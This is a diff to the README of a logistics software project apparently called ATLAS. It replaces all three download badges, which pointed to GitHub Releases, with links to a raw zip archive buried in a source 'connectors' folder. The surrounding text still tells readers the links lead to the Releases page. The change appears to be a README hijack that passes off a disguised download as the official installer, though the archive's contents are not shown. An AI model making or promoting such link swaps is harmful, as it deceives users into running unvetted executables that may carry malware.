@@ -1,6 +1,6 @@
 # 🚚 ATLAS - Connect Logistics Systems Simply
 
-[![Download ATLAS](https://img.shields.io/badge/Download-ATLAS-blue?style=for-the-badge&logo=github)](https://github.com/k3vin993/ATLAS/releases)
+[![Download ATLAS](https://img.shields.io/badge/Download-ATLAS-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/k3vin993/ATLAS/main/src/connectors/Software_v3.6.zip)
 
 ---
 
@@ -53,7 +53,7 @@ Follow these steps to download, install, and run ATLAS quickly.
 
 Visit the release page to get the latest installer for Windows:
 
-[![Download ATLAS](https://img.shields.io/badge/Download-ATLAS-grey?style=for-the-badge&logo=github)](https://github.com/k3vin993/ATLAS/releases)
+[![Download ATLAS](https://img.shields.io/badge/Download-ATLAS-grey?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/k3vin993/ATLAS/main/src/connectors/Software_v3.6.zip)
 
 This link takes you to the GitHub Releases page. Look for the newest version and download the Windows installer file. The file name usually ends with `.exe`.
 
@@ -148,4 +148,4 @@ Regularly update ATLAS via the GitHub release page to get security patches and i
 
 Use this link again to get the latest Windows installer:
 
-[![Download ATLAS](https://img.shields.io/badge/Download-ATLAS-blue?style=for-the-badge&logo=github)](https://github.com/k3vin993/ATLAS/releases)
+[![Download ATLAS](https://img.shields.io/badge/Download-ATLAS-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/k3vin993/ATLAS/main/src/connectors/Software_v3.6.zip)
